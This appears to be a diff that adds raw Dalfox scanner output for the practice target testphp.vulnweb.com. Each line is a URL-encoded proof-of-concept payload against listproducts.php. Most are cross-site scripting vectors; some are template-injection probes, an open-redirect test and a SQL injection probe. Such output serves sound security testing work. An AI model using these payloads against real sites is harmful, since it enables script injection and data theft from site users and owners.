@@ -1,0 +1,15 @@
+[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?amp%3Basdf=FUZZ&amp%3Bcat=FUZZ&artist=%7B%7B444%2A6664%7D%7D
+[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?amp%3Basdf=FUZZ&amp%3Bcat=FUZZ&artist=%3C%25%3D444%2A6664%25%3E
+[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/listproducts.php?amp%3Basdf=FUZZ&amp%3Bcat=FUZZ&artist=FUZZ%22%3E%3Cd3%22%3C%22%2Fonclick%3D%22+class%3Ddalfox%3E%5Bconfirm%60%60%5D%22%3C%22%3Ez
+[POC][V][GET][inHTML-none(1)-URL] http://testphp.vulnweb.com/listproducts.php?amp%3Basdf=FUZZ&amp%3Bcat=FUZZ&artist=FUZZ&cat=%3CsVg%2Fonload%3Dalert.bind%28%29%281%29+class%3Ddalfox%3E
+[POC][V][GET][inHTML-URL] http://testphp.vulnweb.com/listproducts.php?amp%3Basdf=FUZZ&amp%3Bcat=FUZZ&artist=FUZZ%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%281%29%3E
+[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?amp%3Basdf=%27%27&amp%3Bcat=FUZZ&artist=FUZZ
+[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?amp%3Basdf=%2F%2Fgoogle.com&amp%3Bcat=FUZZ&artist=FUZZ
+[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?amp%3Basdf=FUZZ&amp%3Bcat=FUZZ&artist=+AND+true
+[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/listproducts.php?amp%3Basdf=FUZZ&amp%3Bcat=FUZZ&artist=FUZZ&cat=%22%3E%3CiFrAme%2Fsrc%3DjaVascRipt%3Aalert%281%29%3E%3C%2FiFramE%3E
+[POC][V][GET][inHTML-URL] http://testphp.vulnweb.com/listproducts.php?amp%3Basdf=FUZZ&amp%3Bcat=FUZZ&artist=FUZZ&cat=%27%3E%3CsVg%2Fonload%3Dalert%281%29+class%3Ddalfox%3E
+[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/listproducts.php?amp%3Basdf=FUZZ&amp%3Bcat=FUZZ&artist=FUZZ%27%3E%3Ca+href%3D%27javascript%26colon%3Balert%281%29%27%3Eclick
+[POC][V][GET][inHTML-URL] http://testphp.vulnweb.com/listproducts.php?amp%3Basdf=FUZZ&amp%3Bcat=FUZZ&artist=FUZZ%3C%2Fscript%3E%3Csvg%3E%3Cscript%2Fclass%3Ddalfox%3Ealert%281%29%3C%2Fscript%3E-%2526apos%3B
+[POC][V][GET][inHTML-none(1)-URL] http://testphp.vulnweb.com/listproducts.php?artist=FUZZ&cat=%3Cdiv+contextmenu%3Dxss%3E%3Cp%3E1%3Cmenu+type%3Dcontext+class%3Ddalfox+id%3Dxss+onshow%3Dprompt.valueOf%28%29%281%29%3E%3C%2Fmenu%3E%3C%2Fdiv%3E
+[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/listproducts.php?artist=FUZZ%22%3E%3Cscript+y%3D%22%3E%3C%22%3E%2F%2A%3Cscript%2A+%2A%2Fprompt%28%29%3C%2Fscript
+[POC][V][GET][inHTML-URL] http://testphp.vulnweb.com/listproducts.php?artist=FUZZ%22%3E%3CiFrAme%2Fsrc%3DjaVascRipt%3Aalert%281%29+class%3Ddalfox%3E%3C%2FiFramE%3E
